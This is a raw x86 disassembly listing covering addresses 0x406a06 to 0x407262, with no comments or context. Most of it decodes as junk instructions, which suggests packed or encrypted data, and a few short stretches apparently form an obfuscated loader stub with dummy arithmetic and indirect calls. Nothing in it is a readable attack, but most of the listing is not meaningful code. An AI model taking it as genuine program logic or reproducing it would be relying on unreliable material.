  406a06:	sub    ecx,esi
  406a08:	jb     0x40698f
  406a0a:	xchg   esi,eax
  406a0b:	ja     0x406a06
  406a0d:	and    DWORD PTR [esi],esi
  406a0f:	out    dx,eax
  406a10:	mov    ds:0x50c1764c,eax
  406a15:	xchg   BYTE PTR [ecx+0x6b],dl
  406a18:	retf   
  406a19:	rcl    DWORD PTR [edx-0x3e],cl
  406a1c:	dec    esi
  406a1d:	(bad)  
  406a1e:	cmc    
  406a1f:	in     eax,dx
  406a20:	pop    ds
  406a21:	sub    BYTE PTR cs:[ecx],bl
  406a24:	pop    esp
  406a25:	test   eax,0xa41d28bf
  406a2a:	repz fbld TBYTE PTR [ecx]
  406a2d:	imul   edi,DWORD PTR [esi+edx*8],0xe76715dd
  406a34:	ror    DWORD PTR [edx+0x6e82e1ef],cl
  406a3a:	inc    eax
  406a3b:	push   esi
  406a3c:	xchg   edi,eax
  406a3d:	mov    edx,ebp
  406a3f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406a40:	and    BYTE PTR [eax-0xa],bh
  406a43:	sub    BYTE PTR [ebp-0x2e],0x6
  406a47:	push   0xffffffa6
  406a49:	lea    eax,[ecx-0x48]
  406a4c:	ds inc ebx
  406a4e:	test   al,0x3b
  406a50:	mov    ds:0x74e65eb3,eax
  406a55:	jle    0x406aa0
  406a57:	repz mov bh,cl
  406a5a:	stc    
  406a5b:	ret    
  406a5c:	or     ch,0xbf
  406a5f:	out    0xeb,eax
  406a61:	in     eax,dx
  406a62:	repz (bad) 
  406a64:	leave  
  406a65:	retf   0x4700
  406a68:	pushf  
  406a69:	repnz mov al,ds:0x5f4f6f32
  406a6f:	jle    0x406ac7
  406a71:	ret    
  406a72:	xchg   esi,eax
  406a73:	sar    BYTE PTR [eax-0x40c914d3],0xb3
  406a7a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406a7b:	mov    bl,0xa8
  406a7d:	lea    esp,[ebx+0x7c]
  406a80:	aaa    
  406a81:	out    0xc6,eax
  406a83:	ss aas 
  406a85:	mov    edi,0x667c5778
  406a8a:	sub    eax,0x83ed800
  406a8f:	fiadd  DWORD PTR [ecx+0x2fe8a854]
  406a95:	enter  0x11ed,0x3c
  406a99:	xor    edx,ebx
  406a9b:	mov    ah,0x1f
  406a9d:	fs or  dl,bl
  406aa0:	sbb    al,0x15
  406aa2:	mov    cl,0x9d
  406aa4:	outs   dx,DWORD PTR ds:[esi]
  406aa5:	mov    esi,edx
  406aa7:	fldcw  WORD PTR [ebx+0x2a]
  406aaa:	mov    fs,WORD PTR ds:0x5b429d78
  406ab0:	push   ebx
  406ab1:	out    dx,al
  406ab2:	ins    DWORD PTR es:[edi],dx
  406ab3:	dec    eax
  406ab4:	mov    edx,DWORD PTR [edx+0x32898e26]
  406aba:	dec    DWORD PTR [ebx]
  406abc:	les    ebp,FWORD PTR [eax-0x8]
  406abf:	test   eax,0x9c05c133
  406ac4:	jb     0x406af8
  406ac6:	add    cl,cl
  406ac8:	ret    0x1c
  406acb:	push   ebp
  406acc:	mov    ebp,esp
  406ace:	sub    esp,0x78
  406ad1:	mov    eax,ds:0x41b1a8
  406ad6:	mov    DWORD PTR [ebp-0x10],eax
  406ad9:	mov    eax,ds:0x41b2b4
  406ade:	sub    DWORD PTR ds:0x42e6fb,0x487f
  406ae8:	mov    DWORD PTR [ebp-0x30],eax
  406aeb:	xor    DWORD PTR ds:0x42fd01,0x6d44
  406af5:	mov    DWORD PTR [ebp-0xc],0xf89c8531
  406afc:	inc    DWORD PTR ds:0x42fcd9
  406b02:	mov    DWORD PTR [ebp-0x14],0xf89c8530
  406b09:	sub    DWORD PTR ds:0x42e6ef,0x7e8e
  406b13:	mov    eax,DWORD PTR [ebp-0xc]
  406b16:	push   ebx
  406b17:	push   esi
  406b18:	push   edi
  406b19:	movzx  esi,WORD PTR ds:0x42fcd9
  406b20:	and    esi,DWORD PTR ds:0x42e128
  406b26:	mov    DWORD PTR ds:0x42fcd9,esi
  406b2c:	mov    esi,0x7510855
  406b31:	mov    DWORD PTR ds:0x42e6f3,0x1a
  406b3b:	cmp    DWORD PTR ds:0x42e6f3,0x0
  406b42:	je     0x406c66
  406b48:	cmp    DWORD PTR ds:0x42e6f3,0x27
  406b4f:	jne    0x406b61
  406b55:	push   DWORD PTR [ebp-0xc]
  406b58:	push   DWORD PTR [ebp-0x24]
  406b5b:	call   DWORD PTR ds:0x42e2df
  406b61:	mov    edi,DWORD PTR ds:0x42e6f3
  406b67:	dec    edi
  406b68:	mov    DWORD PTR ds:0x42e6f3,edi
  406b6e:	jmp    0x406b3b
  406b73:	mov    DWORD PTR ds:0x42fcf1,0x10
  406b7d:	cmp    DWORD PTR ds:0x42fcf1,0x0
  406b84:	je     0x406c66
  406b8a:	cmp    DWORD PTR ds:0x42fcf1,0x1c
  406b91:	jne    0x406bad
  406b97:	push   DWORD PTR [ebp-0x10]
  406b9a:	push   0x42fcfd
  406b9f:	push   0x29f4
  406ba4:	push   DWORD PTR [ebp-0x14]
  406ba7:	call   DWORD PTR ds:0x42e53f
  406bad:	mov    edi,DWORD PTR ds:0x42fcf1
  406bb3:	dec    edi
  406bb4:	mov    DWORD PTR ds:0x42fcf1,edi
  406bba:	jmp    0x406b7d
  406bbf:	and    DWORD PTR ds:0x42fce5,0x0
  406bc9:	jmp    0x406bdb
  406bce:	mov    edi,DWORD PTR ds:0x42fce5
  406bd4:	inc    edi
  406bd5:	mov    DWORD PTR ds:0x42fce5,edi
  406bdb:	cmp    DWORD PTR ds:0x42fce5,0x15
  406be2:	jae    0x406c66
  406be8:	cmp    DWORD PTR ds:0x42fce5,0x1e
  406bef:	jne    0x406c06
  406bf5:	push   DWORD PTR [ebp-0xc]
  406bf8:	push   0x42fced
  406bfd:	push   DWORD PTR [ebp-0x10]
  406c00:	call   DWORD PTR ds:0x42e45b
  406c06:	jmp    0x406bce
  406c0b:	and    DWORD PTR ds:0x42fd76,0x0
  406c15:	mov    edi,DWORD PTR ds:0x42fd76
  406c1b:	inc    edi
  406c1c:	mov    DWORD PTR ds:0x42fd76,edi
  406c22:	cmp    DWORD PTR ds:0x42fd76,0x5
  406c29:	jne    0x406c3f
  406c2f:	push   0x42e707
  406c34:	push   0x42e1a4
  406c39:	call   DWORD PTR ds:0x42e543
  406c3f:	cmp    DWORD PTR ds:0x42fd76,0x4
  406c46:	jne    0x406c59
  406c4c:	mov    edi,DWORD PTR ds:0x42fd76
  406c52:	inc    edi
  406c53:	mov    DWORD PTR ds:0x42fd76,edi
  406c59:	cmp    DWORD PTR ds:0x42fd76,0x1b
  406c60:	jb     0x406c15
  406c66:	xor    eax,esi
  406c68:	sub    DWORD PTR ds:0x42e713,ecx
  406c6e:	mov    edi,0x32729c
  406c73:	add    eax,edi
  406c75:	xor    DWORD PTR ds:0x42e70b,0x42fd76
  406c7f:	mov    DWORD PTR [ebp-0x20],eax
  406c82:	mov    DWORD PTR [ebp-0x28],0xf89cb531
  406c89:	jmp    0x406fd6
  406c8e:	inc    ecx
  406c8f:	jae    0x406d0b
  406c91:	pop    ebp
  406c92:	sub    dh,BYTE PTR [ebp+0x61]
  406c95:	jae    0x406ce4
  406c97:	and    ebp,DWORD PTR [eax]
  406c99:	mov    bh,0x71
  406c9b:	lahf   
  406c9c:	pop    es
  406c9d:	out    dx,eax
  406c9e:	pop    ss
  406c9f:	lds    esi,FWORD PTR [eax+0x70]
  406ca2:	and    BYTE PTR [ebp+0x70],bh
  406ca5:	jo     0x406cd4
  406ca7:	imul   eax,esp,0xd056d577
  406cad:	sahf   
  406cae:	inc    eax
  406caf:	(bad)  
  406cb0:	mov    esp,0xb0b8354b
  406cb5:	sti    
  406cb6:	sub    ah,BYTE PTR [ebp+0x983c5c4]
  406cbc:	push   0xef7a87ab
  406cc1:	pop    ss
  406cc2:	xchg   ecx,eax
  406cc3:	dec    ebp
  406cc4:	outs   dx,BYTE PTR ds:[esi]
  406cc5:	fldcw  WORD PTR [edi+0x74]
  406cc8:	scas   al,BYTE PTR es:[edi]
  406cc9:	mov    edx,0xd16dbc25
  406cce:	dec    edi
  406ccf:	pop    ss
  406cd0:	inc    esp
  406cd1:	lods   al,BYTE PTR ds:[esi]
  406cd2:	xchg   DWORD PTR ds:0xe1aa72d1,esi
  406cd8:	shl    DWORD PTR [eax-0x494e98bd],1
  406cde:	out    0xf6,eax
  406ce0:	loop   0x406d17
  406ce2:	rol    DWORD PTR [esi+ebp*1-0x14],cl
  406ce6:	cmp    eax,0x26a2adcb
  406ceb:	xchg   ebp,eax
  406cec:	aad    0xb1
  406cee:	fdivp  st(6),st
  406cf0:	ror    BYTE PTR [edx-0x6aa15546],1
  406cf6:	loope  0x406d28
  406cf8:	inc    esi
  406cf9:	xchg   ebx,eax
  406cfa:	cmp    al,0x7c
  406cfc:	dec    ebx
  406cfd:	stos   DWORD PTR es:[edi],eax
  406cfe:	mov    ds:0x5471d1bd,eax
  406d03:	inc    ebp
  406d04:	outs   dx,DWORD PTR ds:[esi]
  406d05:	jo     0x406cf8
  406d07:	add    eax,0x8e9a4090
  406d0c:	inc    BYTE PTR [eax-0x371779da]
  406d12:	sub    al,0x2e
  406d14:	fldz   
  406d16:	sbb    al,0x1e
  406d18:	inc    ecx
  406d19:	or     eax,0x48511430
  406d1e:	and    al,0x84
  406d20:	loopne 0x406d1b
  406d22:	jmp    0xd8503867
  406d27:	div    esp
  406d29:	dec    eax
  406d2a:	(bad)  
  406d2b:	retf   
  406d2c:	pop    ds
  406d2d:	and    cl,BYTE PTR [edx]
  406d2f:	mov    bh,0x47
  406d31:	dec    edi
  406d32:	mov    ah,0xf3
  406d34:	scas   al,BYTE PTR es:[edi]
  406d35:	sbb    DWORD PTR [ecx],esp
  406d37:	jns    0x406db8
  406d39:	(bad)  
  406d3a:	xor    eax,0x6a37632
  406d3f:	push   esi
  406d40:	cmp    BYTE PTR [edx+0x74a18806],dl
  406d46:	push   ecx
  406d47:	xchg   esi,eax
  406d48:	and    ch,BYTE PTR [edx+0x3c]
  406d4b:	mov    WORD PTR [edx-0x2],?
  406d4e:	sbb    ecx,ebx
  406d50:	cmp    al,0x86
  406d52:	xchg   edx,eax
  406d53:	test   ecx,eax
  406d55:	imul   esp,edx,0x62d79569
  406d5b:	sub    DWORD PTR [edx],edi
  406d5d:	xor    BYTE PTR [edx-0x5e78e5c3],bl
  406d63:	inc    ebp
  406d64:	int3   
  406d65:	sbb    al,0xcd
  406d67:	dec    edx
  406d68:	dec    ebp
  406d69:	or     DWORD PTR [edx+0x4dd4848f],ecx
  406d6f:	stc    
  406d70:	xchg   esi,eax
  406d71:	push   ss
  406d72:	fnsave [ecx]
  406d74:	rcr    DWORD PTR [edx],cl
  406d76:	mov    ebp,0xc2bcfc71
  406d7b:	adc    esp,DWORD PTR [esi]
  406d7d:	lahf   
  406d7e:	enter  0x30fe,0x8a
  406d82:	adc    eax,0xeb8a05a9
  406d87:	mov    cl,0xcd
  406d89:	lods   eax,DWORD PTR ds:[esi]
  406d8a:	imul   edx,DWORD PTR [esp+edx*8+0x47],0x88036116
  406d92:	idiv   BYTE PTR [ebp-0x58]
  406d95:	mov    ds,WORD PTR [edi+ebx*4]
  406d98:	jb     0x406d5c
  406d9a:	push   ebx
  406d9b:	in     al,dx
  406d9c:	push   cs
  406d9d:	xchg   esp,eax
  406d9e:	inc    edi
  406d9f:	cmp    al,0xa7
  406da1:	in     al,dx
  406da2:	je     0x406d51
  406da4:	pop    ds
  406da5:	das    
  406da6:	jge    0x406d2a
  406da8:	into   
  406da9:	fs jle 0x406dda
  406dac:	mov    DWORD PTR [eax-0x31970cd6],ecx
  406db2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406db3:	test   BYTE PTR [ebx],bl
  406db5:	mov    ds:0x22b1f5bf,al
  406dba:	sub    ebp,DWORD PTR [ebp-0x4d5ed225]
  406dc0:	xchg   ecx,eax
  406dc1:	in     al,0xd
  406dc3:	pop    ebx
  406dc4:	pushf  
  406dc5:	ja     0x406d5a
  406dc7:	jns    0x406d94
  406dc9:	mov    dl,0x11
  406dcb:	sbb    eax,0x3455ee31
  406dd0:	rol    BYTE PTR [ecx],0x94
  406dd3:	jle    0x406e4d
  406dd5:	sar    DWORD PTR [esi-0x1],0xc8
  406dd9:	ins    DWORD PTR es:[edi],dx
  406dda:	daa    
  406ddb:	addr16 jb 0x406e40
  406dde:	fistp  QWORD PTR [edi-0x6386212]
  406de4:	sbb    DWORD PTR [ebp+0x2],eax
  406de7:	mov    edx,0xcb9c646a
  406dec:	sbb    BYTE PTR ds:0x286690b6,ch
  406df2:	je     0x406dc2
  406df4:	jnp    0x406e21
  406df6:	cmc    
  406df7:	mov    ds:0x132327a5,al
  406dfc:	add    al,0x59
  406dfe:	call   0x76d9:0x5c3f2882
  406e05:	xchg   edi,eax
  406e06:	mov    edx,0xaee04b65
  406e0b:	jno    0x406e26
  406e0d:	xchg   esi,eax
  406e0e:	outs   dx,BYTE PTR ds:[esi]
  406e0f:	shl    DWORD PTR es:[edx-0x1ce69813],1
  406e16:	mov    eax,ds:0x838b761f
  406e1b:	loop   0x406dae
  406e1d:	xchg   ebx,eax
  406e1e:	(bad)  
  406e1f:	push   ebx
  406e20:	rcl    DWORD PTR [edi],1
  406e22:	sahf   
  406e23:	lods   al,BYTE PTR ds:[esi]
  406e24:	loopne 0x406e77
  406e26:	sub    DWORD PTR [esi+ebp*2],ebx
  406e29:	cdq    
  406e2a:	dec    ebp
  406e2b:	mov    al,0x37
  406e2d:	inc    ecx
  406e2e:	rcl    BYTE PTR [edi+0x6b4b35fa],cl
  406e34:	not    DWORD PTR [ebx]
  406e36:	pop    ebp
  406e37:	xchg   edx,eax
  406e38:	test   DWORD PTR [eax-0x1f],0xec288112
  406e3f:	adc    al,0xbc
  406e41:	push   es
  406e42:	lods   al,BYTE PTR gs:[esi]
  406e44:	cmp    al,0x2c
  406e46:	call   0xf00d:0x6ebe03d5
  406e4d:	cwde   
  406e4e:	cmp    al,0xb8
  406e50:	pop    ebx
  406e51:	(bad)  
  406e53:	and    DWORD PTR [ecx+0x67d1a382],edx
  406e59:	pop    edi
  406e5a:	push   eax
  406e5b:	adc    DWORD PTR [esi],ecx
  406e5d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406e5e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406e5f:	mov    edx,ebp
  406e61:	ja     0x406edc
  406e63:	dec    ebx
  406e64:	jb     0x406e29
  406e66:	and    cl,bh
  406e68:	inc    esi
  406e69:	(bad)  [edx]
  406e6b:	retf   0x9613
  406e6e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406e6f:	mov    bl,0xd0
  406e71:	outs   dx,BYTE PTR ds:[esi]
  406e72:	(bad)  
  406e74:	int3   
  406e75:	sub    al,0x2b
  406e77:	outs   dx,BYTE PTR ds:[esi]
  406e78:	push   cs
  406e79:	or     dl,dh
  406e7b:	aas    
  406e7c:	int    0x51
  406e7e:	cli    
  406e7f:	and    BYTE PTR [ebp+0x232f0a94],al
  406e85:	lods   eax,DWORD PTR ds:[esi]
  406e86:	or     al,0x14
  406e88:	sbb    eax,eax
  406e8a:	test   DWORD PTR [ebx],edx
  406e8c:	mov    eax,0x6b5ee11a
  406e91:	mov    cl,0x58
  406e93:	daa    
  406e94:	mov    esp,0x48bd83f3
  406e99:	aad    0xe9
  406e9b:	icebp  
  406e9c:	std    
  406e9d:	stos   DWORD PTR es:[edi],eax
  406e9e:	jmp    0xd02dee80
  406ea3:	adc    DWORD PTR [edi-0x66695cb],ebp
  406ea9:	icebp  
  406eaa:	fisubr DWORD PTR [edx]
  406eac:	jmp    0xcb29:0x1068b8ad
  406eb3:	adc    DWORD PTR [ebx+0x38],ecx
  406eb6:	mov    eax,0x8af64777
  406ebb:	in     al,dx
  406ebc:	fwait
  406ebd:	lahf   
  406ebe:	xor    al,0x96
  406ec0:	mov    cl,0xc0
  406ec2:	scas   al,BYTE PTR es:[edi]
  406ec3:	ins    BYTE PTR es:[edi],dx
  406ec4:	mov    bh,0x6b
  406ec6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406ec7:	in     al,dx
  406ec8:	dec    edi
  406ec9:	clc    
  406eca:	adc    cl,BYTE PTR [ecx+0x6]
  406ecd:	inc    ecx
  406ece:	dec    esi
  406ecf:	or     eax,0xd91b3cbb
  406ed4:	jne    0x406f2c
  406ed6:	fcom   QWORD PTR [ecx+0x31]
  406ed9:	cmp    ah,dl
  406edb:	mov    ss,WORD PTR [ebx-0x76]
  406ede:	cmc    
  406edf:	xchg   esp,ebp
  406ee1:	cmp    BYTE PTR [esi],ch
  406ee3:	scas   al,BYTE PTR es:[edi]
  406ee4:	fnsave [edi-0x72]
  406ee7:	adc    ah,BYTE PTR [edi-0x7c42b55d]
  406eed:	cmp    ebx,ebx
  406eef:	fs jge 0x406eac
  406ef2:	adc    BYTE PTR [esi-0x46],dl
  406ef5:	sbb    edi,DWORD PTR [ecx]
  406ef7:	ret    0x4581
  406efa:	jmp    ecx
  406efc:	or     DWORD PTR [edi],ebp
  406efe:	and    ebp,ecx
  406f00:	push   esi
  406f01:	std    
  406f02:	dec    esi
  406f03:	(bad)  [ebx+ebp*1-0x28]
  406f07:	fmulp  st(7),st
  406f09:	cmp    al,0xeb
  406f0b:	mov    BYTE PTR [edi],dh
  406f0d:	jge    0x406f00
  406f0f:	xor    ch,BYTE PTR [ebx-0x44820691]
  406f15:	mov    esp,0xecb6369e
  406f1a:	popf   
  406f1b:	nop
  406f1c:	fidiv  DWORD PTR [ecx-0x25014e43]
  406f22:	jb     0x406f45
  406f24:	xor    al,0x43
  406f26:	mov    edi,0xf08173de
  406f2b:	stos   DWORD PTR es:[edi],eax
  406f2c:	imul   edx,DWORD PTR [ebx+0x492e6fcb],0xdadf62eb
  406f36:	and    DWORD PTR [edx+ebx*8+0x4beee243],edx
  406f3d:	jo     0x406f73
  406f3f:	loopne 0x406ef7
  406f41:	into   
  406f42:	data16 das 
  406f44:	push   edx
  406f45:	jecxz  0x406fc2
  406f47:	ror    esi,1
  406f49:	mov    dl,0x48
  406f4b:	xor    BYTE PTR [eax+0x2a],bh
  406f4e:	bound  edi,QWORD PTR [ecx-0x76]
  406f51:	cmp    edx,0xffffffc9
  406f54:	leave  
  406f55:	and    DWORD PTR [esi+0x19305ad5],0x6b
  406f5c:	and    DWORD PTR [ebp+0x0],ebp
  406f5f:	push   ss
  406f60:	and    bh,bh
  406f62:	pushf  
  406f63:	fadd   QWORD PTR [ebx]
  406f65:	sub    cl,bl
  406f67:	cmp    DWORD PTR [ebp+0x41],0xfa5e29ce
  406f6e:	or     BYTE PTR [edi+0x27],dh
  406f71:	and    cl,cl
  406f73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406f74:	(bad)  
  406f75:	mov    edx,0xcf97bad2
  406f7a:	or     BYTE PTR [ebx+esi*8-0x7e31f46f],bl
  406f81:	dec    esp
  406f82:	stos   BYTE PTR es:[edi],al
  406f83:	mov    ch,0x38
  406f85:	add    DWORD PTR ds:0xbb6434bd,edi
  406f8b:	mov    eax,0x701b4867
  406f90:	test   eax,0xcf893b31
  406f95:	(bad)  
  406f96:	xchg   edi,eax
  406f97:	cmp    bh,dl
  406f99:	mov    edx,gs
  406f9b:	inc    edi
  406f9c:	dec    esi
  406f9d:	xchg   ebp,eax
  406f9e:	mov    ds:0xac1fa339,eax
  406fa3:	push   es
  406fa4:	rol    DWORD PTR [edx+edi*1],1
  406fa7:	retf   
  406fa8:	retf   
  406fa9:	std    
  406faa:	leave  
  406fab:	test   eax,0x832a5618
  406fb0:	pop    ebx
  406fb1:	dec    edx
  406fb2:	mov    cl,ah
  406fb4:	popa   
  406fb5:	repz or eax,0x60cc774b
  406fbb:	cwde   
  406fbc:	fldenv [edx-0x6194fad]
  406fc2:	fild   DWORD PTR [bx+0x27]
  406fc6:	adc    BYTE PTR [ebp-0x765c0496],0x80
  406fcd:	jl     0x406fbb
  406fcf:	or     eax,0x7c871d42
  406fd4:	sbb    cl,al
  406fd6:	mov    DWORD PTR [ebp-0x34],0xf89f0531
  406fdd:	adc    DWORD PTR ds:0x42fd72,0x42e70b
  406fe7:	mov    DWORD PTR [ebp-0x2c],0xf89c85f1
  406fee:	mov    DWORD PTR [ebp-0x24],0xf89c85d1
  406ff5:	add    eax,0xac
  406ffa:	jmp    0x407347
  406fff:	sbb    al,0x75
  407001:	sar    DWORD PTR [esi+0x71b35a51],1
  407007:	lahf   
  407008:	popa   
  407009:	sti    
  40700a:	arpl   WORD PTR [edx],bx
  40700c:	pushf  
  40700d:	or     eax,0x70c2c7d8
  407012:	jo     0x407034
  407014:	jge    0x407086
  407016:	jo     0x406ffc
  407018:	lock push ecx
  40701a:	cmp    DWORD PTR ds:[esi],ecx
  40701d:	ror    DWORD PTR [edx-0x10],0x63
  407021:	xchg   ebx,eax
  407022:	repz add al,bh
  407025:	stc    
  407026:	cmp    ah,al
  407028:	sti    
  407029:	add    bl,BYTE PTR [ecx]
  40702b:	rol    DWORD PTR [esi+ebx*4+0x5eddc28a],0x6b
  407033:	loop   0x407095
  407035:	push   es
  407036:	mov    ds:0xe7547737,eax
  40703b:	jne    0x407036
  40703d:	lahf   
  40703e:	xlat   BYTE PTR ds:[ebx]
  40703f:	ds aam 0x90
  407042:	or     BYTE PTR [esp+ecx*8-0x69],al
  407046:	loopne 0x4070b1
  407048:	in     eax,0x58
  40704a:	sar    BYTE PTR [ebp-0x76b1dd9a],cl
  407050:	add    al,0x5d
  407052:	pop    edx
  407053:	nop
  407054:	neg    DWORD PTR [ecx+0x21ea4bba]
  40705a:	sar    BYTE PTR [ebp-0x1f],cl
  40705d:	xor    edx,DWORD PTR [ebp+0x4e3e0f53]
  407063:	daa    
  407064:	push   eax
  407065:	mov    DWORD PTR [ebp-0x51],edx
  407068:	cmp    ah,ah
  40706a:	sub    ecx,DWORD PTR [eax-0x24bf3419]
  407070:	xchg   edi,eax
  407071:	sbb    al,dh
  407073:	ror    BYTE PTR [edi-0x4c],0x45
  407077:	xor    ah,BYTE PTR [ebx+0x63]
  40707a:	fs clc 
  40707c:	xchg   ecx,eax
  40707d:	mov    ah,0x91
  40707f:	fld    TBYTE PTR [ecx-0x50]
  407082:	ret    
  407083:	or     ah,dl
  407085:	test   eax,0x36e5b1f2
  40708a:	loop   0x4070c6
  40708c:	ror    DWORD PTR [esi],0x83
  40708f:	jno    0x4070d8
  407091:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407092:	or     edx,DWORD PTR [eax]
  407094:	hlt    
  407095:	adc    BYTE PTR [ebp-0x42cac89f],0x89
  40709c:	adc    DWORD PTR [ebp+0x55],0x4b
  4070a0:	pop    ebp
  4070a1:	dec    eax
  4070a2:	aam    0x73
  4070a4:	push   esi
  4070a5:	mov    ebx,0xd094bafb
  4070aa:	pop    esp
  4070ab:	sub    bl,bl
  4070ad:	mov    edx,0xad1d53b1
  4070b2:	xor    edi,DWORD PTR [edx+0x22]
  4070b5:	fcom   QWORD PTR [eax+0x63d32971]
  4070bb:	std    
  4070bc:	dec    edx
  4070bd:	push   0x40
  4070bf:	daa    
  4070c0:	or     BYTE PTR [ecx+0xf],cl
  4070c3:	pop    esp
  4070c4:	pop    esi
  4070c5:	shr    BYTE PTR [esi],1
  4070c7:	adc    al,0x8
  4070c9:	xchg   dx,ax
  4070cb:	sbb    edx,DWORD PTR [edx]
  4070cd:	pop    esi
  4070ce:	and    DWORD PTR [ebx+0x4cbae9a2],esi
  4070d4:	cmp    al,0x7c
  4070d6:	cmc    
  4070d7:	push   esi
  4070d8:	sbb    eax,ebp
  4070da:	add    eax,0x9f0f5a6c
  4070df:	loope  0x407132
  4070e1:	retf   
  4070e2:	cwde   
  4070e3:	aas    
  4070e4:	jl     0x407143
  4070e6:	and    eax,0xfa43a721
  4070eb:	jg     0x40714a
  4070ed:	leave  
  4070ee:	jmp    0x112f:0x421a68b6
  4070f5:	push   ebp
  4070f6:	imul   ecx,DWORD PTR [esi+0xa8d8414],0x54
  4070fd:	and    dl,BYTE PTR [ebp-0x7f]
  407100:	int3   
  407101:	sub    eax,0xda0e5b9d
  407106:	ret    0x2337
  407109:	enter  0xb99d,0x9c
  40710d:	sti    
  40710e:	scas   eax,DWORD PTR es:[edi]
  40710f:	xchg   DWORD PTR [eax],esi
  407111:	outs   dx,DWORD PTR ds:[esi]
  407112:	jmp    0x3755:0xa55ced22
  407119:	jmp    0xe0ad:0x9fe0c063
  407120:	fxtract 
  407122:	pop    eax
  407123:	cli    
  407124:	(bad)  
  407125:	bound  esp,QWORD PTR [ebx]
  407127:	cmp    edi,DWORD PTR [ebx+0x376b346f]
  40712d:	std    
  40712e:	mov    ebx,0x3867de37
  407133:	aam    0x5e
  407135:	cmp    DWORD PTR [ebx+esi*8+0x27a1273a],edi
  40713c:	outs   dx,BYTE PTR ds:[esi]
  40713d:	mov    ecx,0x4c6ef31
  407142:	mov    WORD PTR [esi],fs
  407144:	adc    BYTE PTR [ebp-0x5f],bh
  407147:	mov    esi,0x633d548
  40714c:	ins    BYTE PTR es:[edi],dx
  40714d:	jmp    0xe48adc07
  407152:	popa   
  407153:	fnsave [eax]
  407155:	call   0xa448:0x27eb0c31
  40715c:	push   ecx
  40715d:	test   DWORD PTR [edi],esi
  40715f:	out    0xa5,al
  407161:	ror    esi,0xc5
  407164:	out    dx,al
  407165:	dec    esi
  407166:	ja     0x4070f0
  407168:	nop
  407169:	ret    
  40716a:	ja     0x40714c
  40716c:	pop    ds
  40716d:	(bad)  
  40716e:	fdivr  DWORD PTR [edx]
  407170:	aas    
  407171:	push   esi
  407172:	jo     0x407116
  407174:	stc    
  407175:	pop    esp
  407176:	inc    edi
  407177:	icebp  
  407178:	in     eax,0x4a
  40717a:	gs or  ebp,esi
  40717d:	sbb    eax,0xaa4ed093
  407182:	aas    
  407183:	xchg   DWORD PTR [edi-0x3a],ecx
  407186:	or     DWORD PTR [ebx+edi*4],ecx
  407189:	mov    DWORD PTR [esi+0x69942a3e],ecx
  40718f:	pop    ss
  407190:	data16 jae 0x4071c7
  407193:	mov    cl,0xa5
  407195:	pop    esi
  407196:	cmp    BYTE PTR [edi+0x9967366],0xbf
  40719d:	mov    cl,0xaa
  40719f:	mov    ah,0x89
  4071a1:	mov    ebp,0x1f36b577
  4071a6:	or     DWORD PTR [eax],ebp
  4071a8:	in     al,dx
  4071a9:	retf   
  4071aa:	push   esi
  4071ab:	in     al,0xf5
  4071ad:	push   es
  4071ae:	adc    al,0xd8
  4071b0:	jne    0x407156
  4071b2:	dec    eax
  4071b3:	fild   DWORD PTR [edi]
  4071b5:	(bad)  
  4071b6:	in     eax,dx
  4071b7:	(bad)  [ecx+0x27]
  4071ba:	cmp    DWORD PTR [eax+0x30],ebp
  4071bd:	popa   
  4071be:	lahf   
  4071bf:	inc    ecx
  4071c0:	sub    edi,DWORD PTR [eax]
  4071c2:	inc    edx
  4071c3:	adc    eax,0x2cbc011c
  4071c8:	ror    bh,0x24
  4071cb:	xor    al,0xde
  4071cd:	cmp    DWORD PTR [edx+0x24],ebx
  4071d0:	jno    0x40715b
  4071d2:	popf   
  4071d3:	jns    0x4071f1
  4071d5:	cmp    DWORD PTR [ecx],0xffffffbd
  4071d8:	setl   dl
  4071db:	xor    eax,0x867dd636
  4071e0:	sub    eax,0xd3a7cbdd
  4071e5:	sbb    edi,edx
  4071e7:	or     ah,BYTE PTR [edx+esi*2]
  4071ea:	xchg   DWORD PTR [edi+0x50],edi
  4071ed:	xchg   edi,eax
  4071ee:	adc    ebx,eax
  4071f0:	jnp    0x407204
  4071f2:	mov    bh,0x52
  4071f4:	inc    edx
  4071f5:	sbb    BYTE PTR [ebp-0x65bdf154],bh
  4071fb:	push   edi
  4071fc:	push   esp
  4071fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4071fe:	ret    
  4071ff:	std    
  407200:	das    
  407201:	daa    
  407202:	aam    0xcd
  407204:	rdseed ebp
  407207:	inc    edx
  407208:	loopne 0x40723a
  40720a:	mov    ss,WORD PTR [edx-0x5b0f128f]
  407210:	inc    edx
  407211:	and    al,BYTE PTR [esi]
  407213:	imul   ecx,DWORD PTR [eax],0x6d19683c
  407219:	ins    BYTE PTR es:[edi],dx
  40721a:	pop    ecx
  40721b:	adc    al,0xfe
  40721d:	dec    esi
  40721e:	daa    
  40721f:	mov    cl,0x6c
  407221:	nop
  407222:	sahf   
  407223:	mov    ecx,DWORD PTR ds:0xc72a8ae3
  407229:	mov    cl,0xac
  40722b:	xchg   ch,dl
  40722d:	scas   al,BYTE PTR es:[edi]
  40722e:	mov    al,ds:0xada6bbd
  407233:	mov    ds,WORD PTR [ebx-0x7c]
  407236:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407237:	sbb    al,0x5c
  407239:	and    al,0xdc
  40723b:	push   cs
  40723c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40723d:	mov    DWORD PTR [esi-0x33],ebp
  407240:	xchg   BYTE PTR ds:0xf7d0051e,ch
  407246:	(bad)  
  407247:	imul   edx,DWORD PTR [ecx+eiz*8-0x3b],0x6c
  40724c:	sbb    eax,ebx
  40724e:	outs   dx,BYTE PTR ds:[esi]
  40724f:	scas   eax,DWORD PTR es:[edi]
  407250:	adc    edx,ecx
  407252:	mov    edi,0x5c289a1a
  407257:	mov    bl,0x5f
  407259:	pop    esi
  40725a:	sbb    dh,BYTE PTR [edi]
  40725c:	test   al,0x49
  40725e:	adc    BYTE PTR [edx-0x27],cl
  407261:	int3   
  407262:	not    DWORD PTR [ebx]
